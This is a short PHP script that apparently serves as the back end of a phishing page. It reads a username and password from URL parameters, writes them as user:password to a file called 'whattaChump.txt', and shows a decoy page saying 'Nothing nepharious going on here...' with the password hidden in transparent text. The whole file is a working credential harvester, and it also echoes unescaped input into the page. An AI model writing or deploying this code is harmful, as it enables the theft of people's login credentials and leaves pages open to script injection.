<?php
$victimFile = fopen("whattaChump.txt", "w");
fwrite($victimFile, $_GET['user']);
fwrite($victimFile,':');
fwrite($victimFile, $_GET['password']);
fclose($victimFile);
echo "
	<style>
		html, body{width: 100%; height: 100%;}
		body{
			background: black;
			}
		p{
			color: white;
			}
	</style>
";
echo "<div>";
echo "<p> Nothing nepharious going on here... </p>";
echo "<p style='color:transparent'>";
echo $_GET['password'];
echo "</p>";
echo "</div>";
?>
